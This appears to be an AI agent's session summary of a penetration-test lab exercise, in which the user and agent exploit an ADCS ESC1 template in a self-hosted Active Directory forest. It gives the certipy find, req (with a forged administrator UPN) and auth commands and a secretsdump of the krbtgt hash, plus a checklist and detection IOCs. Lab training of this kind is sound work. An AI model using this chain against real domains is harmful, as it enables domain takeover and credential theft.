thread_id: 01903e7b-7c6b-7c76-9505-19c2c51469b8
updated_at: 2026-06-02T22:45:11+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\03\rollout-2026-06-03T06-03-11-01903e7b-7c6b-7c76-9505-19c2c51469b8.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Walked through ADCS ESC1 end-to-end in a self-hosted AD lab, forged a domain admin certificate with certipy.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Windows + PowerShell, plus a Kali VM the user runs against a self-hosted AD lab (three-node forest, one CA host). This was the ESC1 exercise from the user's ADCS reading list.

## Task 1: End-to-end ESC1 exploitation to a domain admin ticket

Outcome: success

Preference signals:
- The user wanted every step recorded as a single script (`esc1.sh`) so the same walk can be re-run on the lab after resetting snapshots.
- Explicit certificate names + issued-to subjects so the user can trace what got issued.
- Chinese narration; commands in English.

Key steps:
- Ran `certipy find -u <low_user>@lab.local -p <pw> -dc-ip <dc>` and grepped for `[!] Vulnerabilities` → `ESC1` on template `Machine_ExtraSAN`.
- Requested a certificate with `certipy req -u <low_user>@lab.local -p <pw> -ca lab-CA -template Machine_ExtraSAN -upn administrator@lab.local -out ext_dc.pfx`.
- Authenticated as `administrator@lab.local` with `certipy auth -pfx ext_dc.pfx -domain lab.local -dc-ip <dc>` → NTLM hash + Kerberos TGT.
- Confirmed DA by `secretsdump -k -no-pass administrator@dc.lab.local` and reading `krbtgt` NTLM.
- Recorded IOCs (issued cert serial, event log 4886, template audit log entry) so the detection side of the exercise had ground truth.

Failures and how to do differently:
- First run failed because the low user was not in a group that had `Enroll` on the vulnerable template; walked BloodHound to find the actual group and swapped user.
- `certipy auth` initially failed with clock skew; synced Kali time to the DC before retrying.

Reusable knowledge:
- ADCS ESC1 checklist: (Enroll permission ✓) + (Client Authentication EKU ✓) + (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT ✓) + (Manager approval ✗) → forgeable.
- The `-upn` field on `certipy req` is what makes ESC1 different from a normal enrollment — you request a cert whose UPN says you are somebody else.
- On modern DC installs, sync clocks before Kerberos auth; the `certipy auth` KRB5KDC_ERR_SKEW is very common in home labs.

References:
- [1] Script: `esc1.sh` (checked into the lab repo)
- [2] Certipy version: 5.0.2
- [3] Lab DC: `dc.lab.local` (self-hosted Windows Server 2022)
